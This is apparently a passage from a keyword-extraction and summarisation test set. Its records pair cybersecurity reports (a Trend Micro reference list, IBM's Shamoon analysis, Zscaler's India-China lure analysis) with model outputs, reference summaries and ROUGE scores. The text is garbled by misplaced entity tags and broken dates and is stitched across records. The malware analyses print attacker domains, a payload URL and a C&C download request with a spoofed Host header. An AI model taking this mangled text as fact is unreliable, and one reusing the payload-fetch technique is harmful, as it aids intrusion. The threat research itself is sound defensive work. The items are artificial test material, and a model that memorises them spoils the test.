[WORK_OF_ART] Payment [WORK_OF_ART] Surge . \u201d Accessed on [DATE] Aug. [DATE] 12,2021 , at url [ORG] Department [ORG] of [ORG] Treasury . ( n.d . ) . [ORG] Treasury [ORG] Department . \u201c [ORG] Advisory [ORG] on [ORG] Potential [ORG] Sanctions [ORG] Risks [ORG] for [ORG] FacilitatingRansomware [ORG] Payments . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url advisory_10012020_1.pdf.25 [PERSON] Phil [PERSON] Goldstein . ( [DATE] March 9 , [DATE] 2020 ) . [ORG] Sate [ORG] Tech [ORG] Magazine . \u201c [GPE] New [GPE] York May Ban Ransomware Payments from [ORG] Municipalities . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url municipalities.26 [PERSON] Arielle [PERSON] Waldman . ( [DATE] June [DATE] 16 , [DATE] 2020 ) . [ORG] Tech [ORG] Target . \u201c [WORK_OF_ART] Repeat [WORK_OF_ART] Ransomware [WORK_OF_ART] Attacks [WORK_OF_ART] Hit 80 % of [NORP] Victims who [PERSON] Paid [PERSON] Ransoms . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url of - victims - who - paid - ransoms.27 [PERSON] Erin [PERSON] Johnson . ( [DATE] March [DATE] 2 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [LAW] Emotet [LAW] One [LAW] Month After the Takedown . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url [PERSON] Andy [PERSON] Greenberg . ( [DATE] Jan. 27 , [DATE] 2021 ) . Wired . \u201c [ORG] Cops [ORG] Disrupt [ORG] Emotet , the Internet \u2019s \u2018 Most Dangerous Malware . \u2019 \u201d Accessed on Aug.12 , [DATE] 2021 , at url [ORG] Department [ORG] of [ORG] Justice [ORG] Office [ORG] of [ORG] Public [ORG] Affairs . ( [DATE] Jan. 28 , [DATE] 2021 ) . \u201c [WORK_OF_ART] Emotet [WORK_OF_ART] Botnet [WORK_OF_ART] Disrupted in International Cyber Operation . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url [WORK_OF_ART] Cybereason [WORK_OF_ART] Nocturnus . ( [DATE] April [DATE] 2 , [DATE] 21019 ) . [PERSON] Cyberreason . \u201c A [TIME] One [TIME] - [TIME] two Punch of [PERSON] Emotet , [ORG] TrickBot , [ORG] & [ORG] Ryuk [ORG] Stealing [ORG] & [ORG] RansomingData . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url then - ransom - data.31 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] March 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT [PERSON] Continues [PERSON] Attack on the Cloud , Targets AWSCredentials . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url the - cloud -- targets - aws - credentials.html.32 [PERSON] Magno [PERSON] Logan and [PERSON] David [PERSON] Fiser . ( [DATE] May 25 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Targets Kubernetes , [CARDINAL] Nearly [CARDINAL] 50,000 IPs [PERSON] Compromisedin Worm [PERSON] - like Attack . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url kubernetes -- nearly-50 - 000 - ips - compromised.html.33 Trend Micro . ( [DATE] Jan. [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Earth Wendigo Injects [PERSON] JavaScript [PERSON] Backdoor for [ORG] Mailbox [ORG] Exfiltration . \u201d Accessed onAug . [DATE] 12 , [DATE] 2021 , at url worker - for-.html.34 Adi Peretz and [PERSON] Erick [PERSON] Thek . ( [DATE] March . [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [LOC] Earth [LOC] Vetala \u2013 MuddyWater Continues to [PERSON] Target [PERSON] Organizationsin [LOC] the [LOC] Middle [LOC] East . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url muddywater - continues - to - target - organizations - in - t.html.35 [PERSON] Daniel [PERSON] Lunghi and [PERSON] Kenney [PERSON] Lu . ( [DATE] April 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Iron [PERSON] Tiger [PERSON] APT [PERSON] Updates [PERSON] Toolkit [PERSON] With [PERSON] Evolved SysUpdate Malware . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url sysupdate - malware - va.html.47 | Attacks From All Angles : 2021 Midyear Cybersecurity Report36 [PERSON] Gilbert [PERSON] Sison , [PERSON] Abraham [PERSON] Camba , and [PERSON] Ryan [PERSON] Maglaque . ( [DATE] Jan. [DATE] 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Investigation into PlugX UncoversUnique APT Technique . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url uncovers - plugx - unique - technique - in - apt - attack.html.37 [PERSON] Paul [PERSON] Pajares . ( [DATE] July 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Threats [WORK_OF_ART] Ride on the Covid-19 [PERSON] Vaccination [PERSON] Wave . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , aturl [PERSON] Paul [PERSON] Pajares . ( [DATE] July 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Threats [WORK_OF_ART] Ride on the Covid-19 [PERSON] Vaccination [PERSON] Wave . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , aturl [ORG] Echo [ORG] Duan and [PERSON] Jesse [PERSON] Chang . ( [DATE] Feb [DATE] 15 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c SHAREit Flaw Could Lead to Remote Code Execution . \u201d [GPE] Accessedon [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url html.40 S\u00e9bastien Dudek . ( [DATE] Jan. 26 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Low Powered and High Risk : Possible Attacks on LoRaWAN Devices . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url Possible - Attacks - on - LoRaWAN - Devices.html.41 S\u00e9bastien Dudek . ( [DATE] Feb. [DATE] 18 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Gauging [ORG] LoRaWAN [ORG] Communication [ORG] Security with LoraPWN . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url html.42 S\u00e9bastien Dudek . ( [DATE] March 30 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [PRODUCT] Protecting [PRODUCT] LoRaWAN [PRODUCT] Hardware from Attacks in the Wild . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url html.43 [ORG] Trend [ORG] Micro . ( [DATE] May 27 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Transition [WORK_OF_ART] to [WORK_OF_ART] 5 G : [WORK_OF_ART] Security [WORK_OF_ART] Implications [WORK_OF_ART] of [WORK_OF_ART] Campus [WORK_OF_ART] Networks . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url implications - of - campus - networks.44 [PERSON] Stephen [PERSON] Hilt and [PERSON] Fernando Merces . ( [DATE] Jan. [DATE] 19 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c VPNFilter [DATE] Two [DATE] Years [DATE] Later : Routers Still Compromised . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url compromised-.html.45 [LOC] Nitesh [LOC] Surana . ( [DATE] April [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Could [ORG] the [ORG] Microsoft [ORG] Exchange breach be stopped ? \u201d Accessed on [DATE] Aug. [DATE] 12,2021 , at url Nitesh Surana . ( [DATE] April [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Could [ORG] the [ORG] Microsoft [ORG] Exchange breach be stopped ? \u201d Accessed on [DATE] Aug. [DATE] 12,2021 , at url [PERSON] Benjamin [PERSON] Delpy . ( [DATE] July 17 , [DATE] 2021 ) . Twitter . \u201c Printnightmare . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url [WORK_OF_ART] The [WORK_OF_ART] Windows [WORK_OF_ART] Team . ( [DATE] June 28 , [DATE] 2021 ) . Windows . \u201c [WORK_OF_ART] Update [WORK_OF_ART] on [WORK_OF_ART] Windows [WORK_OF_ART] 11 minimum system requirements . \u201d Accessed onAug . [DATE] 12 , [DATE] 2021 , at url requirements/.49 Trend Micro . ( [DATE] Feb. 23 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Constant [WORK_OF_ART] State [WORK_OF_ART] Of Flux : [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] 2020 [WORK_OF_ART] Annual [WORK_OF_ART] Cybersecurity [WORK_OF_ART] Report . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url a - constant - state - of - flux - trend - micro-2020 - annual - cybersecurity - report.50 [PERSON] Anthony [PERSON] Spadafora . ( [DATE] Feb. 9 , [DATE] 2021 ) . [PERSON] Tech [PERSON] Radar . \u201c VPN usage saw major spike [DATE] last [DATE] year [DATE] - here \u2019s why . \u201d Accessed on [DATE] Aug. [DATE] 12,2021 , at url [PERSON] Ivana [PERSON] Vojinovic . ( [DATE] March 21 , [DATE] 2021 ) . Data Prot . \u201c [ORG] VPN [ORG] Statistics for [DATE] 2021 \u2013 Keeping Your Browsing Habits Private . \u201d [GPE] Accessedon [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url#:~:text = The%20VPN%20industry%20is%20 expected , ages%20of%2016%20and%2024.52 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] March 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT [PERSON] Continues [PERSON] Attack on the Cloud , Targets AWSCredentials . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url the - cloud -- targets - aws - credentials.html.53 [PERSON] Magno [PERSON] Logan and [PERSON] David [PERSON] Fiser . ( [DATE] May 25 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Targets Kubernetes , [CARDINAL] Nearly [CARDINAL] 50,000 IPs [PERSON] Compromisedin Worm [PERSON] - like Attack . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url kubernetes -- nearly-50 - 000 - ips - compromised.html.54 [PERSON] Steven [PERSON] J. Vaughan [PERSON] - Nichols . ( [DATE] May [DATE] 6 , [DATE] 2020 ) . ZDNet . \u201c Most popular operating systems of [DATE] 2020 : The more things change \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url | Attacks From All Angles : 2021 Midyear Cybersecurity [ORG] ReportTREND [ORG] MICROTM [ORG] RESEARCH [ORG] Trend [ORG] Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threat techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com", "generated_text": "the report; Trend Micro; threat actors; organizations; the first half of 2021; the first half of this year; ransomware; malware attacks; advanced persistent threat; APT; teams; vulnerabilities; systems; servers; Kubernetes; Asia; the second half; targeted attacks; the threat landscape; the first half of the year; millions; credit cards; websites; critical flaws; Microsoft; Kubernetes; ARM64; vulnerabilities; Windows; Linux; Covid-19; information leaks; DDoS attacks; Multifaceted defenses; use; malicious content; sites; a variety; infrastructure; systems; providers; military; government organizations; threat intelligence; vigilance; insight; threat actors; businesses.", "ref_text": "<START-1>The midyear cybersecurity report examines the threat landscape in the first half of 2021, highlighting evolving ransomware attacks, APT campaigns compromising business systems, upgraded criminal techniques, vulnerabilities in widely used technology, and cloud threats. Key points: - Sophisticated ransomware continued targeting major organizations using double extortion, with ransomware like Ryuk, Egregor and DoppelPaymer active. New families emerged while detections declined. - APT groups like Earth Wendigo, Earth Vetala, and Iron Tiger conducted stealthy campaigns, often exploiting vulnerabilities in webmail, cloud servers, and more to steal data. - Threats rode on COVID-19 vaccine rollouts, with vaccine-themed phishing and fake registration apps. Overall COVID-related threats declined 50% from 1H 2020. - Mac threats like XCSSET evolved to target new M1 chips and exploit browsers. Vulnerabilities were found in widely used apps like SHAREit. - Technical issues like cloud misconfigurations remained, with new Kubernetes and AWS attacks seen. Vulnerabilities were disclosed across OSes, including critical Exchange Server and PrintNightmare bugs. - Old threats like TeamTNT and VPNFilter reemerged in new cloud and network attacks. Cryptominers remained prevalent, topping malware detections. - The report emphasizes the need for multilayered defenses to meet diverse, evolving threats targeting networks, endpoints, cloud, mobile, and more from all angles. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.35624999999999996, "gpt3/lexical/rouge_rouge2": 0.12578616352201258, "gpt3/lexical/rouge_rougeL": 0.2375, "gpt3/lexical/rouge_rougeLsum": 0.2375, "gpt3_generated_text": ["The article is a summary of Trend Micro's 2021 Midyear Cybersecurity Report. It highlights the various cyber threats and attacks that occurred in the first half of 2021. The report discusses modern ransomware attacks that prompted emergency responses and resulted in multimillion-dollar payouts. It also mentions advanced persistent threat (APT) teams exploiting vulnerabilities in online portals, webmail servers, and popular technology. The report emphasizes the need for multifaceted defenses against attacks from all angles. It also mentions the ongoing threat landscape, including COVID-19-themed scams and the importance of maintaining cybersecurity vigilance. Overall, the report provides insights into the evolving tactics and techniques used by cybercriminals and the need for organizations to stay proactive in their defense against cyber threats."]}, {"split_name": "test", "sample_id": "test_20", "prompt_text": "Extract the keywords: The Full Shamoon : How the Devastating Malware Was Inserted Into NetworksFebruary 15 , 2017 | By [PERSON] Kevin [PERSON] Albano Co - authored by Limor KessemiStockAuthored team . Researchers from the [ORG] IBM X - Force Incident Response and [ORG] Intelligence [ORG] Services ( [ORG] IRIS ) team identi\ufb01ed a missing link in the operations of a threat   actor involved in recent [LOC] Shamoon malware attacks against [LOC] Gulf state organizations . These attacks , which occurred in [DATE] November [DATE] 2016 and [DATE] January [DATE] 2017 , reportedly a\ufb00ected [CARDINAL] thousands of computers across multiple government and civil organizations in   [GPE] Saudi [GPE] Arabia and elsewhere in [LOC] Gulf states . Shamoon is designed to destroy computer hard drives by wiping the master boot record ( [ORG] MBR ) and data irretrievably , unlike ransomware , which holds the data hostage for a fee . Through their recent investigations , our forensics analysts pinpointed the initial compromise vector and post - compromise operations that led to the deployment of the destructive [LOC] Shamoon malware on targeted infrastructures . It \u2019s worth mentioning that , according to X - Force [ORG] IRIS , the initial compromise took place [DATE] weeks before the actual [PERSON] Shamoon deployment and activation were launched . [PERSON] Shamoon [PERSON] Attacks Preceded by Malicious [PERSON] Macros and [ORG] PowerShell [ORG] Commands Since Shamoon incidents feature the in\ufb01ltration and escalation stages of targeted attacks , X - Force [ORG] IRIS responders sought out the attackers \u2019   entry point . Their \ufb01ndings pointed to what appears to be the initial point of compromise the attackers used : a document containing a malicious   macro that , when approved to execute , enabled [CARDINAL] C2 communications to the attacker \u2019s server and remote shell via [ORG] PowerShell . The document was not the only one discovered in the recent attack waves . X - Force IRIS researchers had been tracking earlier activity associated with similar malicious , [ORG] PowerShell - laden documents themed as resumes and human resources documents , some of which related to organizations in [GPE] Saudi [GPE] Arabia . This research identi\ufb01ed several bouts of o\ufb00ensive activity that occurred in [DATE] the [DATE] past [DATE] few [DATE] months , which revealed    similar operational methods in which the attackers served malicious documents and other malware executables from web servers to their targets to establish an initial foothold in the network . READ THE WHITE PAPER : DEALING WITH A DATA BREACH \u2014 BEFORE , DURING AND AFTERInitial Compromise Vector Previously UnclearAlthough Shamoon was previously documented in research blogs , the speci\ufb01c   network compromise methods leading to the attacks have remained unclear in the reported cases . X - Force [ORG] IRIS researchers studied [ORG] Shamoon \u2019s attack life cycle and observed its tactics at [NORP] Saudi - based organizations and private sector companies . This research led them to believe that the actor using [FAC] Shamoon in recent attacks relied heavily on weaponized documents built to leverage [ORG] PowerShell to establish their initial network foothold and subsequent operations:1 . Attackers send a spear phishing email to employees at the target organization . The email contains a [ORG] Microsoft [ORG] O\ufb03ce document as an   attachment.2 . Opening the attachment from the email invokes [ORG] PowerShell and enables command line access to the compromised machine.3 . Attackers can now communicate with the compromised machine and remotely execute commands on it.4 . The attackers use their access to deploy additional tools and malware to other endpoints or escalate privileges in the network.5 . Attackers study the network by connecting to additional systems and locating critical servers.6 . The attackers deploy the Shamoon malware.7 . A coordinated [PERSON] Shamoon outbreak begins and computer hard drives across the organization are permanently wiped . Figure A Phish Is Speared X - Force IRIS identi\ufb01ed the below malicious document : DetailInfoFile registrant registered com - ho[.]me in [DATE] October [DATE] 2016 and used it to serve malicious documents with similar macro activation features . Thefollowing list of documents included : File Namecv.doccv_itworx.doccv_mci.docdiscount_voucher_codes.xlsmHealth_insurance_plan.docFile organization headquartered in [GPE] Egypt . [ORG] MCI is [GPE] Saudi [GPE] Arabia \u2019s [ORG] Ministry [ORG] of [ORG] Commerce [ORG] and [ORG] Investment . It is possible these names were used in spear phishing emails because they would seem benign to [NORP] Saudi - based employees and lure them to open the attachment . X - Force [ORG] IRIS researchers further identi\ufb01ed that the threat actor behind the malicious documents served many of them using a URL - shortening   scheme in the following pattern : brie\ufb02[.]ink/{a - z0 - 9}[5 ] . File [ORG] DetailFile URLhxxp://brie\ufb02.ink/qhtma The following \ufb01gure is a visual example of what employees may have encountered when they opened the malicious [PERSON] Word \ufb01les sent to them in    preparation for a [WORK_OF_ART] Shamoon attack : Figure IRIS)Passive [ORG] DNS results on a communications domain associated with the [LOC] Shamoon attack revealed related network infrastructure , identifying additional domains used by the threat actors . Domain Namentg - sa[.]comSpoofed [ORG] SiteThe domain ntg - sa[.]com appears to spoof the legit domain ntg.sa.com associated with [ORG] the [ORG] Namer [ORG] Trading [ORG] Group . Per their webpage , NTG \u201c was established primarily to cater the growing demands of [NORP] Petrochemicals waste management within [GPE] the [GPE] Kingdom [GPE] of [GPE] Saudi [GPE] Arabia . \u201dmaps - modon[.]clubThe maps - modon[.]club domain appears to spoof maps.modon.gov.sa , which is associated with [ORG] the [ORG] Saudi [ORG] Industrial [ORG] Property [ORG] Authority , an organization \u201c responsible for the development of industrial cities with integrated infrastructure and services . \u201dX - Force IRIS discovered that the threat actor was hosting [CARDINAL] at [CARDINAL] least [CARDINAL] one malicious executable on a server hosted on ntg - sa[.]com . This \ufb01le duped   targets into believing it was a Flash player installer that would drop a Windows batch to invoke [ORG] PowerShell into the same [CARDINAL] C2 communications . Breakdown of [ORG] the [ORG] PowerShell - Related [ORG] Macro [ORG] Analysis of [CARDINAL] one of the threat actor \u2019s documents found that if the macro executes , it launches [CARDINAL] two separate [PERSON] PowerShell [PERSON] Scripts . The \ufb01rst one   Pupy [ORG] RAT , a publicly available cross - platform remote access tool . The [ORDINAL] second script calls [PRODUCT] VirtualAlloc to create a bu\ufb00er , uses memset to load [GPE] Metasploit - related shellcode into that bu\ufb00er and executes it through   [ORG] CreateThread . [GPE] Metasploit is an open source framework popular as a tool for developing and executing exploit code against a remote target machine . The shellcode performs a [ORG] DWORD [ORG] XOR of [CARDINAL] 4 bytes at an o\ufb00set from the beginning of the shellcode that changes the code to create a   loop so the XOR continues 0x57 times . If this execution is successful , it creates a bu\ufb00er using [PRODUCT] VirtualAlloc and calls InternetReadFile in a loop until all the \ufb01le contents are retrieved    the expected payload is [ORG] PowerShell . Of note , the macro contained a [ORG] DownloadFile ( ) function that would use [ORG] URLDownloadToFileA , but this was never actually used . Based on observations associated with the malicious document , we observed subsequent shell sessions probably associated with [ORG] Metasploit \u2019s Meterpreter that enabled deployment of additional tools and malware preceding deployment of [CARDINAL] three Shamoon - related \ufb01les : ntertmgr32.exe ,   ntertmgr64.exe and [PERSON] vdsk911.sys . Shamoon \u2019s Back , But for How Long This Time ? Although the complete list of [GPE] Shamoon \u2019s victims is not public , [PERSON] Bloomberg reported that in [CARDINAL] one case , [CARDINAL] thousands of computers were destroyed at the headquarters of [ORG] Saudi \u2019s [ORG] General [ORG] Authority [ORG] of [ORG] Civil [ORG] Aviation , erasing critical data and bringing operations to a halt for [DATE] several [DATE] days . The recent activity X - Force [ORG] IRIS is seeing from the [PERSON] Shamoon attackers has so far been detected in [CARDINAL] two waves , but those are likely to subside following the public attention the cases have garnered since late [GPE] 2016.Saudi [GPE] Arabia released a warning to local organizations about the [LOC] Shamoon malware , alerting about potential attacks and advising organizations to prepare . Analysis and warnings about Shamoon are resulting in preparation on the targets \u2019 end , and actors are likely to disappear and change their tactics until the next wave of attacks . READ THE WHITE PAPER : DEALING WITH A DATA BREACH \u2014 BEFORE , DURING AND AFTERFor [PERSON] Advanced [PERSON] Malware | [ORG] IBM X - Force [ORG] Research | Malware [ORG] | [ORG] Network [ORG] Protection [ORG] | [ORG] Network [ORG] Security | X - ForceShare this Article : Kevin AlbanoX - Force IRIS Global Lead for Threat Intelligence , [ORG] IBM [PERSON] Kevin [PERSON] Albano has [DATE] more [DATE] than [DATE] 17 [DATE] years of experience working in information technology , law enforcement and security consulting . Throughout his career , he has focused on investigating computer network intrusions , notifying impacted organizations and disrupting the largest cyber espionage campaigns . At [ORG] IBM , [PERSON] Kevin is responsible for threat intelligence collections , managing advanced threat research and directing information analysis \u2013 all focused on helping customers understand their cyber threat risk and make decisions to protect their organization . Prior to [ORG] IBM , [PERSON] Kevin held prominent roles at [ORG] the [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation ( [ORG] FBI ) and [ORG] Mandiant . As a Special Agent at [ORG] the [ORG] Los [ORG] Angeles FBI Field [PERSON] O\ufb03ce , [PERSON] Kevin developed the investigative process for examining computer network attack operations . [PERSON] Kevin joined    Mandiant from the [ORG] FBI to help defend commercial and government entities against cyber espionage . [PERSON] Kevin has also made signi\ufb01cant contributions to [LAW] the [LAW] Information [LAW] Sharing and   Analysis Organization ( ISAO ) Standards Organization ISAO 300 - 1.SEE ALL POSTSUpcoming WebinarFeatured ArticleOrchestrating Your Incident Response Strategy with [ORG] IBM X - Force [ORG] IRISMarch 10 , [DATE] 2017 [DATE] @ [DATE] 11:00 [DATE] AM [DATE] \u2014 [TIME] 12:00 [TIME] PM [FAC] ESTThe [FAC] Full [FAC] Shamoon : How the Devastating Malware Was Inserted Into By [PERSON] Kevin [PERSON] AlbanoCONTRIBUTORS [PERSON] CONTRIBUTOR \u00a9 [CARDINAL] 2017 [ORG] IBM | Contact | Privacy | Terms Of Use | Accessibility", "generated_text": "malware attacks; Gulf state organizations; November 2016; January 2017; thousands; computers; Saudi Arabia; organizations; the malware; PowerShell command; the attackers; spear phishing emails; Microsoft Office; malware; malware; a spear phishing email; PowerShell commands; command line access; the compromised machine; a remote shell; PowerShell command; keystrokes; Compromise; Command; time; the malware; Indicators; X-Force Incident Response; Intelligence Services; forensics; systems; the network; exploitation.", "ref_text": "<START-1>The document describes research by IBM's X-Force Incident Response and Intelligence Services (IRIS) team into recent Shamoon malware attacks against organizations in Saudi Arabia and other Gulf states. - Shamoon is destructive malware that wipes computer hard drives. The recent attacks occurred in November 2016 and January 2017. - The IRIS team identified the initial point of compromise as weaponized Office documents with malicious macros. When opened, the macros executed PowerShell commands to enable command line access and communicate with attacker servers. - The attackers used PowerShell-laden documents themed as resumes and HR documents to target organizations and establish an initial foothold. The documents were likely delivered via spear phishing. - Analysis of the macro code shows it executed two PowerShell scripts - one downloaded additional malware, while the other used Metasploit functions to retrieve and execute a PowerShell payload from a remote server. - The attackers studied the networks and eventually deployed three files related to Shamoon, which enabled the coordinated malware outbreak to wipe hard drives. - The attacks affected thousands of computers across multiple organizations, destroying critical data and disrupting operations. - While the known Shamoon attacks have subsided after public exposure, the actors are expected to reappear in future waves with evolved tactics. Saudi Arabia has released alerts to help organizations defend against and prepare for potential Shamoon attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5621621621621622, "gpt3/lexical/rouge_rouge2": 0.2554347826086957, "gpt3/lexical/rouge_rougeL": 0.2702702702702703, "gpt3/lexical/rouge_rougeLsum": 0.2702702702702703, "gpt3_generated_text": ["The article discusses the recent Shamoon malware attacks that targeted Gulf state organizations in November 2016 and January 2017, affecting thousands of computers across multiple government and civil organizations in Saudi Arabia and other Gulf states. The IBM X-Force Incident Response and Intelligence Services (IRIS) team identified the initial compromise vector and post-compromise operations that led to the deployment of the destructive Shamoon malware on targeted infrastructures. The attackers used spear phishing emails containing Microsoft Office documents with malicious macros to infiltrate the networks, enabling PowerShell commands and remote shell access to compromised machines. The attackers then deployed additional tools and malware to other endpoints and escalated privileges in the network before deploying the Shamoon malware, which wiped computer hard drives irretrievably. This research sheds light on the specific network compromise methods leading to the attacks and highlights the importance of proactive measures to prevent and respond to such incidents."]}, {"split_name": "test", "sample_id": "test_21", "prompt_text": "Extract the keywords: 6/22/2020Targeted Attack Leverages [GPE] India - [FAC] China [FAC] Border [FAC] DisputeTargeted [FAC] Attack [FAC] Leverages [GPE] India - China Border Disputezscaler.com/blogs/research/targeted-attack-leverages-india-china-border-dispute-lure-victimsPublished on : [DATE] June 19 , [DATE] 2020 Authored by : [PERSON] Atinderpal [PERSON] Singh Nirmal Singh Sahil Antil Category : AnalysisMalwareObfuscationSocial EngineeringMalicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks . The Zscaler ThreatLabZ team recently came across [CARDINAL] one such attack trying to leverage the current [GPE] India - [GPE] China border dispute to lure victims to open an attached malicious document . Key pointsThe attack is fileless as no payload is written on disk and no persistence is created . The shellcode uses a fake HTTP host field while communicating with the command and control ( [ORG] C&C ) server to download the shellcode . It uses the DKMC framework to hide communication in plain sight using steganography . It relies on the Cobalt Strike beacon using a malleable [ORG] C&C profile . Infection It appears as if victims were sent a malicious lure document as an email attachment . The document is named \u201c [GPE] India - [GPE] China border tensions.doc \u201d and contains an article by [ORG] The [ORG] Times [ORG] of [ORG] India article about the same topic . Figure [CARDINAL] 1 : The infection flow of this attack . DocumentThe document contains [CARDINAL] one line that reads \u201c Geostrategic article for SE Asia Security Analyst , \u201d indicating that the target might be a security analyst for southeast [LOC] Asia . Figure [CARDINAL] 2 : The malicious document containing a new article reference . Interestingly , the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing . Though the macro is corrupt , we were able to extract the [ORG] PowerShell command using static analysis . The code obfuscation is very basic . It just subtracts value [CARDINAL] 4 to decrypt the [ORG] PowerShell command.url [ORG] Attack [ORG] Leverages [GPE] India - China Border DisputeFigure 3 : The macro command decryption function . Part of the [ORG] PowerShell command after the base64 decoding looks like this : Figure [CARDINAL] 4 : Part of the [ORG] PowerShell code designed to run shellcode . Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode . The [ORG] PowerShell script is designed to run the shellcode in 32 - bit mode only . It checks if the [ORG] PowerShell script is running with a [CARDINAL] 64 - bit [ORG] PowerShell process using the command int pointer size , which will be [CARDINAL] 8 bytes [ 64bits ] on a [CARDINAL] 64 - bit process . If that is the case , then it tries to run the [ORG] PowerShell in 32 - bit mode with the shellcode injection script code as an argument . Injected shellcodeThis shellcode on execution downloads another shellcode but with a valid [ORG] GIF header , again borrowing a technique from DKMC . Interestingly , this shellcode uses a fake HTML host header and a predefined [ORG] User - Agent field , in this case , to download a [ORG] GIF payload from the C&C IP GET /avatar_32px.jpg HTTP/1.1 User - Agent : Mozilla/5.0 ( Windows NT [CARDINAL] 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like [ORG] Gecko [ORG] Host : update.windows.microsoft.com Connection : Keep - Alive Cache - Control : no - cacheurl [ORG] Attack [ORG] Leverages [GPE] India - China Border DisputeDownloaded payloadThis [ORG] GIF file , just after the [ORG] GIF magic bytes [ \u201c GIF89a \u201d in this case , which is also a valid assembly instruction ] contains a shellcode followed by an XOR - encrypted payload . The shellcode decrypts and executes this payload , which turns out to be a Cobalt Strike beacon . Figure [CARDINAL] 6 : The shellcode and payload before decryption . Figure [CARDINAL] 7 : The shellcode and payload after decryption . The beacon is configured to point to the following [ORG] C&C address \u201c userimage8.360doc.com,/s / ref = nb_sb_noss_1/167 - 3294888 - 0262949 / field- keywords = books \u201d and the same host field and user agent . In another instance , we found a .NET payload , which injects an [ORG] RSA - encrypted payload into a [ORG] notepad.exe file after decryption with the [ORG] C&C addresses . Noticeably , both beacon DLLs use a [ORG] 360doc.com - based [ORG] C&C , and the watermark is exactly the same in both : 305419896.As Cobalt Strike is a well - known commercial tool for red teams , we are not getting into its technical details . Attributionurl Attack Leverages [GPE] India - China Border DisputeAs of now , we are not able to attribute this attack to a specific actor with enough confidence . But here are few observations . The group [ORG] OceanLotus is known to use DKMC , [PERSON] Cobalt [PERSON] Strike , and fileless payloads . But the use of a proper [ORG] GIF header for shellcode seems to be new for them . On the other hand , the watermark value ( [CARDINAL] 305419896 ) found in the beacon configuration has also been used by [ORG] the [ORG] Trickbot [ORG] Group . [PERSON] Zscaler [PERSON] Cloud [PERSON] Sandbox reportFigure [CARDINAL] 8 : The Zscaler Cloud [PERSON] Sandbox report for this malware . Note : The document will crash in this case but if fixed to run , the Zscaler Cloud Sandbox will block its activity . In addition to sandbox detections , [ORG] Zscaler \u2019s multilayered cloud security platform detects indicators at various levels . Check out our Threat Library for more details about 